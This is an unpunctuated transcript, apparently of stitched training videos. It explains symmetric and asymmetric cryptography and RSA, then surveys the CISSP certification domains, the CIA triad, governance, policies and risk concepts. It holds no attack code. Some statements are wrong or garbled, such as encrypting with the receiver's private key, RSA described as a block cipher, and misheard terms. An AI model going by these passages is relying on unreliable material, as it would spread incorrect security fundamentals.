the receiver without fear of
man-in-the-middle attacks
the binary data can be passed through an
algorithmic function
it can have either x or operations as it
is most of the time or any other
mathematical calculations that have the
singular purpose of scrambling the data
the encryption key is generated using
the random bit stream generator and it
acts as a supplement in the algorithmic
function the output is in binary form
which is then converted into the decimal
or hexadecimal format to give our final
ciphertext
on the other hand block ciphers dissect
the raw information into chunks of data
of fixed size
the size of these blocks depend on the
exact cipher being used a 128 bit block
cipher will break the plain text into
blocks of 128 bit each and encrypt those
blocks instead of a single digit
once these blocks are encrypted
individually they are chained together
to form a final cipher text
block ciphers are much slower but they
are more tamper-proof and are used in
some of the most widely used algorithms
employed today
just like stream ciphers the original
ciphertext is converted into binary
format before beginning the process
once the conversion is complete the
blocks are passed through the encryption
algorithm along with the encryption key
this would provide us
with the encrypted blocks of binary data
once these blocks are combined we get a
final binary string
this string is then converted into
hexadecimal format to get our ciphertext
today the most popular symmetric key
algorithms like aes des and 3des are all
block cipher methodology subsets
with so many factors coming into play
there are quite a few things symmetrical
cryptography excels at while falling
short in some other
symmetric key cryptography is much
faster variant when compared to
asymmetric key cryptography there is
only one key in play unlike asymmetric
encryption and this drastically improves
calculation speed in the encryption and
decryption
similarly the performance of symmetric
encryption is much more efficient under
similar computational limitations fewer
calculations help in better memory
management for the whole system
bulk amounts of data that need to be
encrypted are very well suited for
symmetric algorithms since they are much
quicker handling large amounts of data
is simple and easy to use in servers and
data forms this helps in better latency
during data recall and fewer mixed
packets
thanks to its simple single key
structure symmetric key cryptography
algorithms are much easier to set up a
communication channel with and offer a
much more straightforward maintenance
duties once the secret key is
transmitted to both the sender and
receiver without any prior mishandling
the rest of the system aligns easily and
everyday communications becomes easy and
secure if the algorithm is applied as
per the documentation symmetric
algorithms are very robust and can
encrypt vast amounts of data with very
less overhead in a last video on
cryptography we took a look at symmetric
key cryptography
we used a single private key for both
the encryption and decryption of data
and it works very well in theory let's
take a look at a more realistic scenario
now
let's meet joe
joe is a journalist who needs to
communicate with ryan via long distance
messaging
due to the critical nature of the
information people are waiting for any
message to leave joe's house so that
they can intercept it
now joe can easily use symmetric key
cryptography to send the encrypted data
so that even if someone intercepts the
message they cannot understand what it
says
but here's the tricky part
how will joe send the required
decryption key to ryan
the sender of the message as well as the
receiver need to have the same
decryption key so that they can exchange
messages otherwise ryan cannot decrypt
the information even when he receives
the cipher text if someone intercepts
the key while transmitting it there is
no use in employing cryptography since a
third party can now decode all the
information easily
key sharing is a risk that will always
exist when symmetric key cryptography is
being used
thankfully asymmetric key encryption has
managed to fix this problem
let's understand what asymmetric key
cryptography is
asymmetric encryption uses a double
layer of protection
there are two different keys at play
here a private key and a public key
a public key is used to encrypt the
information pre-transit and a private
key is used to decrypt the data post
transit
these pair of keys must belong to the
receiver of the message
the public keys can be shared via
messaging blog posts or key servers and
there are no restrictions
as you can see in the image the two keys
are working in the system the sender
first encrypts the message using the
receiver's private key after which we
receive the ciphertext the ciphertext is
then transmitted to the receiver without
any other key on getting the ciphertext
the receiver uses his private key to
decrypt it and get the plain text back
there has been no requirement of any key
exchange throughout this process
therefore solving the most glaring flaw
faced in symmetry key cryptography
the public key known to everyone cannot
be used to decrypt the message and the
private key which can decrypt the
message need not be shared with anyone
the sender and receiver can exchange
personal data using the same set of keys
as often as possible
to understand this better take the
analogy of your mailbox
anyone who wants to send you a letter
has access to the box and can easily
share information with you
in a way you can say the mailbox is
publicly available to all but only you
have access to the key that can open the
mailbox and read the letters in it
this is how the private key comes to
play
no one can intercept the message and
read its contents since it's encrypted
once the receiver gets its contents he
can use his private key to decrypt the
information
both the public key and the private key
are generated so they are interlinked
and you cannot substitute other private
keys to decrypt the data
in another example if alice wants to
send a message to bob
let's say it reads call me today she
must use bob's public key while
encrypting the message
upon receiving the cipher message bob
can proceed to use his private key in
order to decrypt the message and hence
complete securities attained during
transmission without any need for
sharing the key
since this type of encryption is highly
secure it has many uses in areas that
require high confidentiality
it is used to manage digital signatures
so there is valid proof of a document's
authenticity
with so many aspects of business
transitioning to the digital sphere
critical documents need to be verified
before being considered authentic and
acted upon thanks to asymmetric
cryptography senders can now sign
documents with their private keys anyone
who needs to verify the authenticity of
such signatures can use the sender's
public key to decrypt the signature
since the public and the private keys
are linked to each other mathematically
it's impossible to repeat this
verification with duplicate keys
document encryption has been made very
simple by today's standards but the
background implementation follows the
similar approach
in blockchain architecture asymmetry key
cryptography is used to authorize
transactions and maintain the system
thanks to its two key structures changes
are reflected across the blockchain's
peer-to-peer network only if it is
approved from both ends
along with asymmetric key cryptography's
tamper-proof architecture its
non-repudiation characteristic also
helps in keeping the network stable
we can also use asymmetric key
cryptography combined with symmetrical
cryptography to monitor ssl or tls
encrypted browsing sessions to make sure
nobody can steal our personal
information when accessing banking
websites or the internet in general
it plays a significant role in verifying
websites of authenticity exchanging the
necessary encryption keys required and
generating a session using those keys to
ensure maximum security instead of the
rather insecure http website format
security parameters differ on a session
by session basis so the verification
process is consistent and utterly
essential to modern data security
another great use of the asymmetric key
cryptography structure is transmitting
keys for symmetric key cryptography with
the most significant difficulty in
symmetric encryption being key exchange
asymmetric keys can help clear the
shortcoming
the original message is first encrypted
using a symmetric key the key used for
encrypting the data is then converted
into the cipher text using the
receiver's public key now we have two
ciphertext to transmit to the receiver
on receiving both of them the receiver
uses his private key to decrypt the
symmetry key he can then use it to
decrypt the original information on
getting the key used to encrypt the data
while this may seem more complicated
than just asymmetry key cryptography
alone symmetric encryption algorithms
are much more optimized for vast amounts
of data on some occasions
encrypting the key using asymmetric
algorithms will definitely be more
memory efficient and secure
you might remember us discussing why
symmetric encryption was called private
key cryptography
let us understand why asymmetric falls
under the public key cryptography
we have two keys at our disposal
the encryption key is available to
everyone
the decryption key is supposed to be
private
unlike symmetric key cryptography there
is no need to share anything privately
to have an encrypted messaging system to
put that into perspective we share our
email address with anyone looking to
communicate with us it is supposed to be
public by design so that our email login
credentials are private and they help in
preventing any data mishandling since
there is nothing hidden from the world
if they want to send us any encrypted
information this category is called the
public key cryptography
there are quite a few algorithms being
used today that follow the architecture
of asymmetrical cryptography none more
famous than the rs encryption
rsa encryption is the most widely used
encryption or public key encryption
standard using asymmetric approach
named after its founders rivest shamir
and edelman it uses block ciphers to
obscure the information
if you are unfamiliar with how block
ciphers work there are encryption
algorithms that divide the original data
into blocks of equal size
the block size depends on the exact
cipher being used
once they are broken down these blocks
are encrypted individually and later
chained together to form the final
cipher text
widely considered to be the most
secure form of encryption albeit
relatively slower than symmetric
encryption algorithms it is widely used
in web browsing secure identification
vpns emails and other chat applications
with so many variables in play there
must be some advantages that give
asymmetrical cryptography an edge over
the traditional symmetric encryption
methodologies
let's go through some of them
there is no need for any reliable key
sharing channel in asymmetric encryption
it was an added risk in private key
cryptography that has been completely
eliminated in public key architecture
the key which is made public cannot
recrypt any confidential information and
the only key that can decrypt doesn't
need to be shared publicly under any
circumstance
we have much more extensive key lengths
in rsa encryption and other asymmetric
algorithms like 2048 bits key and 4096
bit keys
larger keys are much harder to break
into via brute force and are much more
secure
asymmetric key cryptography can use as a
proof of authenticity since only the
rightful owner of the keys can generate
the messages to be decrypted by the
private key the situation can also be
reversed encryption is done using a
private key and decryption is done by
the public key which would not function
if the correct private key is not used
to generate the message hence proving
the authenticity of the owner
it also has a tamper protection feature
where the message cannot be intercepted
and changed without invalidating the
private key used to encrypt the data
consequently the public key cannot
decrypt the message and it is easy to
realize the information is not 100
legitimate when and where the case
requires so let's start off this
tutorial by understanding the need for
the cisp certification if you have seen
our previous videos you would be aware
of the various cyber security
certifications like ccna comtia security
plus cism cisa and ceh to name a few you
might have also come across the cssp
certification let me tell you this is
one of the toughest and most in demand
certification in the cyber security
field in the current times managing
information security in a company can be
extremely challenging with the advent of
the internet and various other
technologies there is a large exposure
to various security breaches the
presence of information security experts
in-house helps organizations manage
their i.t processes in a better way this
is where a cisp professional is in
demand by employers compared to the
other cyber security professionals the
demand for cssb certified professionals
has grown rapidly there are nearly 50
000 job postings for the same now that
you have an idea of the demand of cssp
certified professionals let's move on to
understanding what exactly is cisp cssp
stands for certified information system
security professional it is considered
the gold standard in the field of
information security this certification
is taken up by id professionals it
trains a candidate to become an
information assurance professional
taking up the cssb certification will
help you define the design architecture
controls and management of highly secure
business environments you will also be
called a cssp professional only after
you successfully pass the cssp exam so
now let's have a look into the cssp exam
requirements the primary requirement for
any candidate is that they should have
at least five years of work experience
in the field of information security in
addition to this it is also suggested
that the candidate clears other
certifications like ccna comchia
security plus ceh csm and cisa to name a
few cssp is considered as an advanced
level cyber security certification hence
it is better if the candidate clears the
basic level and the managerial level
certifications before moving to the cssp
certification as i mentioned earlier
this certification is suitable for
professionals who have a minimum of five
years of work experience professionals
working as security consultants and
managers network and security architects
it directors security auditors and chief
information security officers can take
up the cssp certification let's now move
on to our next topic that is cisp
domains this entire certification is
grouped into a total of eight domains
the broad spectrum of topics included in
cssp ensure its relevance across all
disciplines in the field of information
security successful candidates are
competent in the following eight domains
they are security and risk management
then we have asset security security
engineering communications and network
security followed by identity and access
management then security assessment and
testing security operations and finally
we have software development security
these eight domains deal with different
aspects of information security we will
have a look into each of these
individually and understand what each of
these domains symbolize first up we have
the security and risk management domain
as the name suggests this domain mainly
consists of the fundamentals of security
policies compliance law and regulations
professional ethics risk management and
threat modeling cyber security and
information security plays a major role
in this domain there is a difference
between cyber security and information
security which is more often missed out
on by people cybersecurity refers to
several techniques used to protect the
integrity of networks whereas
information security refers to processes
and tools deployed to protect sensitive
information to implement cybersecurity
we have a list of approaches like
compliance based ad hoc and risk based
in compliance based security measures
are decided based on regulations while
in ad hoc security measures are based on
no specific criteria in risk-based
security measures are based on unique
risks depending on the organization
let's now have a look at the cia triad
here c stands for confidentiality i for
integrity and a for availability
confidentiality integrity and
availability have served as the industry
standard for computer security since the
time of the first mainframes
confidentiality means that information
and functions can be accessed only by
authorized parties for example military
secrets integrity means that information
and functions can be added altered or
removed only by authorized people and
availability means that systems
functions and data must be available on
demand now that we have understood the
cia triad let's have a look at the grc
trilogy this trilogy is a structured
approach adopted by organizations to
align it objectives with business
objectives first up we have governance
such a program has motives like ensuring
goals are achieved providing strategic
plans and so on governance is taken care
of by the senior professionals of an
organization next up we have risk
management here the organization looks
into mitigating all types of risks such
as investment physical and cyber risks
finally we have compliance as discussed
previously compliance refers to abiding
by the defined laws and regulations so
who do you all think develops a security
policy which is used to achieve the
organization's goals well it is done by
the senior management of an organization
let's have a look at the characteristics
of these security policies first and
foremost these policies should support
the vision and mission of the company
all the business units should be
integrated in these security policies
they should also be regularly updated
and finally it is important that these
security policies should be easy to
understand so that everyone can abide by
them without any problem in addition to
security policies a risk analysis team
is also formed an organization to
perform the analysis of each known risk
there are various steps to perform risk
analysis let's have a look at each of
these first the team makes an assessment
of the value of the company's assets
then there is an analysis made based on
the risks to assets and finally the team
discovers solutions to mitigate these
risks now that was all about the first
domain of cisp security and risk
management let's have a look at the
second domain asset security asset
security deals with the collection and
protection of assets such as data and
devices here we will be looking into
data classification data management data
remnants and data loss prevention so in
data classification the data owner
classifies data a data owner can be an
individual or a group of people who
created the information and are directly
responsible for it this classification
is done based on a set of predefined
criterias at the end the classification
is annually reviewed to see if there has
to be some change incorporated data
management involves managing the
information lifecycle needs of an
enterprise in an effective manner it
also ensures that the data complies to
the set standards and finally data
management also ensures data validity
and integrity moving on to data remnants
it is a term used for the residual of
digital data that is present even after
trying to erase the data data remnants
should be avoided as data should be
completely destroyed to tackle data
remnants we have methods like
overwriting and destruction to name a
few in overwriting other information is
written over the data several times so
that the original data cannot be
recovered in destruction data in the
storage device is physically damaged to
make recovery difficult asset security
also looks into data loss prevention
here several measures and risk
assessments are performed to ensure that
information is only available to
authorized users let's now move on to
our third domain security engineering as
the name suggests this domain talks
about security architecture security
models cryptography and physical
security security architecture
establishes a common practice for
creating analyzing and using
architecture description within a
particular domain security architecture
takes the help of tcb that is trusted
computing base security parameter and
reference models to implement security
cryptography is also a part of security
engineering in cryptography information
is secured by converting data from a
readable format to a non-readable format
and vice versa moving to our fourth
domain we have communications and
network security this domain is all
about network structures transmission
methods and security measures used to
achieve cia in an organization osi model
is the foundation of networking this
model that is the open systems
interconnection model osi model
describes how data is transferred from
one computer to another the osi model
consists of seven layers starting from
physical layer then data link layer
network layer transport layer session
layer presentation layer and finally
application layer in the first layer
that is physical layer transmits raw bit
stream over the physical medium then
data link layer defines the format of
data on the network network layer
provides logical addressing and it also
provides path determination using local
addressing the fourth layer that is
transport layer provides end-to-end
connections in this layer data is
transmitted using transmission protocols
including tcp and udp the session layer
maintains connections and it is also
responsible for controlling ports and
sessions the sixth layer that is the
presentation layer ensures that data is
in a usable format and finally in the
seventh layer that is the in the
application layer human computer
interaction happens here applications
can access the network services the
communications and network security
domain also talks about firewalls we can
define a firewall as a hardware or
software which is used to block the
incoming or outgoing traffic from the
internet to your computer then we also
have the ids ids is known as the
intrusion detection system this is
designed to detect unauthorized access
to a system ids is used together with a
firewall and a router moving to identity
and access management of fifth domain
let's have a look at what this domain is
all about this domain of cssp is all
about the access control identification
authorization and attacks on access
control and its counter measures to be
able to access a data set or a resource
a subject has to be identified
authenticated and authorized identity
management kerberos and access criteria
are few of the crucial fields here in
identity management through automated
means users are identified and
authenticated this domain also speaks of
kerberos an authentication protocol that
is based on symmetric key cryptography
and provides end-to-end security access
to data shouldn't be granted to anyone
and everyone in fact it should be
granted based on the level of trust and
the job role in the organization it is
also better if it is provided based on
the location and the time let's now have
a look at our sixth domain security
assessment and testing so in this domain
we will look into audits security
control assessment and testing reports
as you might have heard of the term
audit it is nothing but a repeated
process wherein an independent
professional evaluates and analyzes
evidence then we have vulnerability
assessment wherein i t risks are
identified and evaluated it helps in
identifying quantifying and prioritizing
vulnerabilities a well-planned and
executed assessment and test strategy
can provide valuable information about
risk and risk mitigation the assessment
and test is executed by a working group
called the integrated product team
testing is performed to check the data
flow between the application and the
system up next we have the security
operations domain the seventh domain of
csp is all about investigations
monitoring and logging disaster recovery
and change management here we will look
into the fields of digital forensics
incident management and perimeter
security investigation of a computer
crime is also known as computer foreign
forensics in digital forensics data is
examined to identify recover and analyze
opinions about digital information
incident management works to restore the
services to normal as soon as possible a
team called the incident response team
is deployed to handle such emergencies
incidence response is defined as a
practice of detecting a problem
determining its costs minimizing the
damage resolving the problem and
documenting each step this team provides
management with sufficient information
and defends the company against future
attacks in perimeter security there is
perimeter defense which allows us to
detect and keep a check on unauthorized
physical access this field also controls
the access to the facility moving on to
our eighth and final domain we have
software development security as the
name suggests this domain talks about
security in a software development
lifecycle here we will be looking into
topics like api malware spyware adware
social engineering attacks and sql
injection attack let's start off with
the application program interface known
as api api is basically a collection of
protocols and functions used to create
applications it supports formats such as
representational state transfer rest and
simple object access protocol rest is
nothing but using the present features
of the web in a simple way and soap
which is an acronym for simple object
access protocol is a messaging protocol
for exchanging data among computers now
let's move on to malware as a security
threat malware is a term which refers to
malicious software viruses ransomware
and worms we can also call trojan virus
as a form of malware which is capable of
disguising itself as a legitimate
software malware is basically a broad
term that refers to a variety of
malicious programs one way to protect
your software from malware is to always
double check your downloads moving on to
our next security threat spyware as the
name suggests this is a software that
typically spies on your system spyware
is also a type of malware which is used
to secretly gather information of the
victim to give it to a third party those
programs that secretly record all that
you do on your computer are called
spyware it is always advised to turn on
pop-up blockers to prevent spyware
next up we have adware adware is also
known as advertising supported software
it is a type of malware that constantly
displays ads and pop-ups some of such
ads can also gather your information at
times adware is not all that dangerous
but it is a hassle as it is a gateway to
unwanted advertising on the screen and
it can also change the browser home page
adwares are known to display unwanted
annoying advertisements on your screens
let's now have a look at social
engineering attacks it is basically the
art of manipulating people so that they
end up giving their confidential
information this attack lures victims
into handing over their confidential
data this attack takes place by tricking
the human mind the most common social
engineering attacks are fishing spear
fishing and whaling fishing attack
phishing attack is a practice wherein
the hacker usually sends fraudulent
emails which appear to be coming from a
very trusted source this is done to
install malware or to steal sensitive
data like credit card information and
various other login credentials
spear phishing attack is a variation of
fishing here the attacker targets a
specific individual or a group of people
and in wailing phishing attack wealthy
powerful and prominent individuals are
made targets moving on to our next
attack we have sql injection attack sql
injection attack is a type of code
injection attack in a database driven
website the hacker manipulates a
standard sql query it allows attackers
to tamper with the existing data here
malicious code is inserted into the sql
server to obtain information so in cissp
as with every security course we start
off with the cia triad now here cia is
confidentiality integrity and
availability so it starts off with every
security mechanism when we talk about
security and we want to keep things
secure what is it that we want to secure
it is the data of an organization that
is the most valuable asset to the
organization and that's what we want to
secure when we say that we want the data
to be secured we basically talk about
three aspects for that data the first
and the foremost that the data needs to
remain confidential the second aspect
that the trader needs to be trustworthy
and the third concept that the data
should be available to all authorized
users when and where they require it so
going back to the first point when we
say we want data to be confidential what
do we mean by that by confidentiality we
talk about that data being made
available only to authorized users after
you have authenticated them insured or
assured of their authenticity and only
then you're going to give access to that
data right so even if you go into an
organization an organization has a
hierarchy of governance right so only
certain people with certain clearances
or certain job titles can have access to
certain amount of data whereas other
people may not have access to it for
example a person working in the sales
department will not have access to data
that is accessed by the hr department
thus that's what we are looking at
classification of data and keeping it
confidential only making it available to
those people who require it when we say
trustworthiness or the integrity of that
data the integrity is where the data has
been altered modified removed deleted by
unauthorized people so we want to
prevent that which means when we say we
want the integrity intact we want to
ensure that only authorized people can
modify alter or remove data if they are
allowed to do so so that's where the
authorization and authentication comes
into the picture again and data needs to
be available for me to safeguard data i
can just lock it up in a safe throw the
safe in the depth of an ocean and say
that the data is secure because it
cannot be leaked out but that data is no
longer available to authorized users
hence the data is useless for me data
would have value when the data remains
confidential has its trustworthiness
intact and is still available to all the
users that are authorized to access it
so when we talk about security we want
these three aspects to be implemented on
any and every digital asset that the
organization has and thus once these
three points are guaranteed or at least
assured to a certain extent we can then
say that the data or that particular
asset is secured moving on let's talk
about information security information
security is the process of protecting
data and information systems so in the
cia as we talked about it when we said
what do we want to protect we want to
protect all the information assets or
the technical assets that we have from
any of the vulnerabilities that can be
identified so we want to restrict
unauthorized access and use we want to
restrict deletion accidental or
intentional if they have not been
authorized to do so modification of data
so the integrity part and destruction of
data destruction could not only be
deleting data but it could be something
like a ransomware where the data gets
encrypted so it's still there it's just
not accessible to you now information
security ensures the implementation of
these following aspects the first and
foremost comes from information security
policies which is the governance aspect
of it the policies are designed to have
a implementation of security in an
organization that helps the business
processes to be executed in a secure
manner where are these policies coming
from they come from standards or
guidelines which are globally available
and based on which we can start
developing our security policies for
example if i want to develop a security
policy in my organization i might want
to depend on frameworks like iso 27001
cobit or something similar once i have
these standards set i would come back to
procedures procedures being how are
these standards to be executed right for
example in my policies i ensured that i
want encryption of aes 256 to be
implemented or rather in the policy i
determined that we want encryption to be
implemented on a data set because based
on the classification of those data so
in my policies i would determine how the
classification is going to work how data
is going to be classified on what
parameters and thus once the data gets
classified we are going to come back to
standards where we say if it is
classified as a confidential data we
want to use encryption to protect that
data and we want aes256 to be in
utilized for encryption so how do we go
about it how do we implement the
encryption that's where your procedures
come into the picture your guidelines
are troubleshooting mechanisms optional
documents so if somebody has trouble
following the procedures they might want
to go into the guidelines and see how to
troubleshoot the scenario that they are
facing baselines are basically the
minimum achievable target that you want
to go with with these policies so let's
say when i say i want to have a baseline
on a server where for the server to be
published onto the internet or to be
used in production environment it has to
meet a certain criteria which means i
can go back to the hardware and i can
say the server needs a hardware
configuration of x y and z let's say a
processor a xeon processor with 16 cores
128 gigs of ram so that's a baseline
that i need for a particular server for
it to be put into production environment
for a particular use anything above that
is acceptable but nothing should go
below that then comes the risk
management while we are implementing
these policies procedures we have those
standards in place if we face any risk
during that period or if we face any
threat or a vulnerability is identified
during this period all these terms we
are going to discuss in a little bit so
when we identify vulnerabilities or
threats that's where our wrists come
into the picture the risk management
comes in saying okay this is a risk that
we have identified and now how do we
want to mitigate the risk then the
security organization comes into the
picture the day-to-day activity of how
security is to be implemented and for
all of these procedures policies
baseline standards to be implemented to
be ensured that they are to be assured
that they are working properly we need
to make our employees aware that these
policies exist this is something that
they need to follow thus the awareness
or the security education comes into the
picture here the security education is
more focused on helping employees adhere
to the company policies and standards
rather than educating employees about
security we don't want to make everybody
an ethical hacker we just want to ensure
them or we want to assure the
organization that everybody has been
warned about policies procedures
security requirements and they are going
to follow those requirements for example
a password policy where you have to
adhere to a specific password policy to
ensure passwords are created at the same
time there is another password policy
which says that you should not share
passwords with your colleagues no matter
what so for me for my employees to
follow that i need to make them aware
that these policies exist and there are
repetitions if they do not follow these
particular policies so coming back to
the governance part what is governance
since we have been talking about it
governance ensures that the security
strategies are aligned with business
objectives and consistent with
regulations so what does it guarantee
appropriate information security
activities are being performed based on
what based on the policies that we have
created based on the standards that we
have and the baselines that we would
have created so security has to be
comparable right so if i say i have
secured against particular attacks the
attacks have to be identified
and then compared to those particular
attacks i can say i have mitigated these
activities by having specific security
controls thus i can say that i am secure
the governance aspects keeps a watch on
all these security controls to see that
those security activities are insured
are being implemented and are performing
to the best of their abilities that's
where your governance comes into the
picture the risks being reduced so the
risk management as also comes under the
governance where you're looking at newly
identified risks and you're then
implementing security controls that
would mitigate these risks then we are
looking at information security
investments appropriately directed so
when i say i want a security control
which would be a firewall ids ips
antiviruses whatever is required it
needs to have a return on investment
which is acceptable for the organization
you don't want to spend up too much of
money in security thus creating losses
for the organization when you say a
business a business objective is always
to make money rather than lose money so
security should be a supporting feature
to the business objectives where the
services are being provided by the
business in a secure manner in such a
way that they can still have a positive
return on investment on the services
that are being provided and the
executive management can determine the
program's effectiveness this is the
major part because we have to even in
any compliances audits technical audits
we have to prove that whatever we have
implemented actually works is effective
does mitigating the risk if your
security controls are not effective then
you have just wasted a bucket load of
money and have not achieved any security
measures in your exercise moving on to
security controls security controls are
measures taken to safeguard an
information system from an attack
basically for the cia triad the
confidential and integrity and
availability so security controls could
be administrative controls technical
controls of physical security controls
what are administrative security
controls there would be policies
procedures that we have in place so the
password policy becomes an
administrative control where the
management has made everybody aware that
the password needs to meet a particular
complexity should not be shared and thus
becomes an administrative security
control a technical security control
would be where we are implementing this
policy and thus when i try to create a
password there is a software that maps
the password to the complexity
requirements assures or ensures that the
complexity requirements have been met
and thus allows the password to be
accepted or rejects the password as the
case may be that is a security control a
physical security control maybe let's
say a cctv camera which you're going to
use to monitor people and uh ensure that
nothing untoward happens it's not only
against physical crime but let's say
access to a particular room where
nobody's seen tailgating
maybe monitoring a server room which is
very well secured and ensuring that
unauthorized people do not get access or
purposefully or intently do not access
that area at all times so these are the
three levels of security controls that
can be implemented to enhance the
security of an organization then we come
to security policies policies is an
overall broad statement produced by a
senior management that dictates the role
of security within the organization for
example the password policy that we
talked about it just said that it needs
to
meet a certain complexity which is a
broad statement that is being made by by
the management saying we want to adhere
to this policy to ensure that we do not
get hacked by brute force attacks or
dictionary attacks or whatever it is the
broad statement is trying to prevent
certain attacks from happening on the
organization how it is implemented
that's where the procedures and
everything else comes into the picture
it must integrate security into all
business processes so if i start
creating a policy which shows that the
complexity should be so high that the
password should be at least 20
characters strong that would be
detrimental to the organization's health
because people may not remember those
passwords or resetting those passwords
or having technical mechanisms technical
security controls in place to implement
that kind of stringent security may be
too expensive to have so whatever
policies are created they need to be in
in line with the business processes as
well the policy must be reviewed and
modified periodically or as company
changes so as and when the company
becomes more mature and can have more
levels of security they must look at
their policies again and redefine them
or as a company grows or changes market
scenarios or changes business processes
these policies may become redundant so
you want to look at those policies and
implement newer policies or modify the
existing policies to suit the business
processes in a better manner it must
support vision and mission of the
organization a business once established
will always have a long-term vision for
example the e-tailer example that we are
talking about for me to open a e-tailer
e-retailing website i don't want it to
be periodic i don't want it to be for a
month or something like that i want to
achieve success in that factor and i
want to create a plan of where i want to
reach let's say in the next five years
so how do i achieve that that's
something that i need to plan as a
business plan all my security mechanisms
that are in place should be in alignment
with the business plans business visions
across the number of years that we have
envisaged the business to perform so
that's where the policies come into the
picture policies are always long-term
not short-term documents but need to be
periodically reviewed and modified as
the business grows or business changes
its posture then looking at compliance
compliance means confirming to a rule
such as a specification policy standard
or law so we have looked at compliance
from a perspective where we talked about
iso 27001 or pci dss or those frameworks
now these are not laws but these are
standards of frameworks that have been
created over a period of time through
experience and these are targeted
towards organizations towards specific
industries for example pci dss is only
towards finance organizations where they
have payment gateways in place the iso
27001 is a more generic policy which can
be implemented by various organizations
hipaa health insurance portability and
accountability act is an american act
that talks about health-related data of
its citizens so these are compliances
these may not be laws but you need to
adhere to these to be effective and to
be
allowed to conduct business in that
particular industry then we have code of
ethics code of ethics state safety of
the commonwealth duty to our principles
and to each other requires that we
adhere and be seen to adhere to the
highest ethical standards of behavior
therefore strict adherence to this code
is a condition of certification what are
the ethics protect society the
commonwealth and the infrastructure act
honorably honestly justly responsibly
responsibility and legally prove
diligent and competent service to the
principles advance and profession now
the code of ethics are codes created by
iic square for the cissp professional
and you need to adhere to these codes if
they identify violation of these codes
from any member they would d bar the
member strip them of the certification
and even blacklist them to based on
whatever uh ethics they have uh violated
so even before the exam you have to go
through the code of ethics you have to
accept the code of ethics in the exam
you may get get up to five to six
questions just on code of ethics
then comes the legal systems uh that's
where the law comes into the picture law
could differ from country to country or
from region to region and thus depending
on which country you're in you may need
to be aware of those laws of those
countries as far as the issp is
concerned ise square is concerned they
are an american organization so they
would talk about mostly american laws
and a few european laws or directives as
well so there are three different laws
that we talk about civil common and
religious laws depends on the country
the culture of that particular country
the information security professional
should understand the different legal
systems followed internationally so you
also may come across the classification
as civil law criminal law and law of
torts civil law is basically a law where
let's say a contract has been breached
and it's not criminal in nature you just
want to sue an organization for breach
of contract criminal law is where
something criminal has happened under
the particular act of that particular
country like let's say a murder or
an attack that has happened a physical
attack or something got stolen and the
third one was the law of torch where
it's more of a compensatory law where
you can file a case a civil suit demand
compensation in lieu of the wrongs that
have happened to that particular
organization or that individual then
comes the personal security the person
the other people inside the organization
need access to data to complete their
assigned work and hence have the
potential to misuse these privileges and
thus you should have personal security
as well now when we talk about hiring
practices for people most of the
organizations perform background checks
and we get confused why these background
checks are being done the background
checks are essential to the health of
the organization where you are ensuring
that the person is not a malicious
person has the prerequisite
certifications or the qualifications
have never been debarred or have never
been prosecuted do not have a criminal
background thus preventing physical
attacks on the organization for example
a competitor may attempt to place in
your organization a spy to spy
to gather information on the secrets of
the organization and report it back to
the competitor a background check may
reveal that this person was previously
employed by a competitor and thus you
might want to verify that how that
employment got terminated when did it
get terminated or is this person
misusing anything or misrepresenting uh
any aspect of his or their life then you
also need to get confidentiality
agreement signed with them for example
ndas non-disclosure agreements data that
is being shared with them the ownership
of that particular data and what are the
repetitions if that confidentiality is
bridged by that particular person
conflict of interest agreements for
positions handling competitive
information as you go higher up in the
organization you might come across
contracts where it prohibits a
particular person in engaging and act
into the same activity with a competitor
for a particular period of time so if
there's a conflict of interest when
you're hiring a person where they have
signed and such a agreement with another
competitor or another organization you
don't want to embroil yourself in a
lawsuit where
the other organization may sue you for
hiring a person while they were still
under that particular contract so it's
not only to look at the background of
these people but to safeguard the
organization from any lawsuits or any
violations of contract as well get the
non-complete agreements for the
positions in charge of unique corporate
processes that again goes on to say if
you're going to leave the organization
you cannot start up a competing business
similar to the organization's business
and so on so forth now let's come back
to the technical aspect and start
talking about vulnerability threats and
risk now what is a vulnerability it is
nothing but a weakness in a system or a
process implies the absence of a counter
measure vulnerability is internal and is
more easily managed so it's basically a
flaw or a misconfiguration or a design
flaw or
something like using defaults username
passwords configurations where if that
particular flaw is misused it will lead
into a security event on that particular
device for that particular organization
so when we say a certain security event
it has to be detrimental in nature so if
somebody is using a weak password that
can easily be cracked that is a
vulnerability where you have identified
a weak password and then you want to
prevent that vulnerability by imposing a
security control or a counter measure
the security control here starts off
with the policy of having a robust
security policy where a password policy
comes in that describes the complexity
of a particular password
and then you talk about a technical
countermeasure where you have
implemented an identity and access
management plan which would ensure that
the person creating that password
adheres to the complexity of that
particular policy then a threat the
threat is the possibility that the
vulnerability might be exploited which
will result in loss so if somebody has
created a weak password and it has been
allowed that's a vulnerability which can
be exploited by the usage of brute force
attacks or
dictionary based attacks to crack
passwords if the password is cracked
somebody unauthorized may get access to
that data thus resulting in a loss for
that organization so the threat is the
possibility of that particular
vulnerability being exploited and then
comes the risk the risk is basically the
likelihood of that attack being
happening so i have a weak password it
can be exploited by a brute forcer
dictionary attack the likelihood of that
attack is what determines the risk level
for me now the likelihood will always be
hypothetical but we don't want to run
helter skelter and we do not want to
take uh the possibility to extreme so
that's where your business processes
come into the picture your security
policies come into the picture based on
the business processes and the policies
implemented if i have a weak password
what would be the loss that i would face
for that particular person for example a
fresher coming into an organization
having a weak password but having
limited access to
data would have a lesser risk because of
the loss being lesser than a ceo of an
organization using a weak password and
thus getting exploited because the ceo
will have access to more proprietary
data that if gets into the competitor's
hand would lead in huge losses thus the
same risk of having a password cracked
for refresher will have a lesser loss
thus a lesser risk compared to the same
risk to a ceo where the loss would be
higher so a threat could also be in
multiple aspects threats could be
natural that means tour fires flooding
tornadoes anything that is an act of god
that can happen with minimal human
interaction or the second threat would
be man-made where man is responsible for
it like theft hacking writing war
anything that is created by a man or
rather humans and technical in nature
could be software bugs where
vulnerabilities create are created or
server failures where something
technical has gone wrong and you need a
technical as skilled person to come in
and repair that particular aspect then
the fourth one would be a supply system
failure or a chain supply failure where
you have dependencies for example any
organization will have a dependency on
an electricity service provider where
they are providing electricity as a
service which powers on the id
infrastructure if the service broader
fails and there is electricity or a
power cut your systems are not going to
work thus you need a secondary mechanism
to prevent that threat from being
realized once we have identified these
threats we have identified these
vulnerabilities and we have identified
the likelihood and the probability of
that attack that's where we come across
the risk management exercise now what is
risk management risk management is a
hypothetical exercise where we have
identified a vulnerability we have
looked at the threat that it may have
and the likelihood of that for our
threat being realized once we have
identified the threat uh the risk level
that's where the risk management comes
into the picture reading from the slides
a core component of enterprise security
program why because we need a baseline
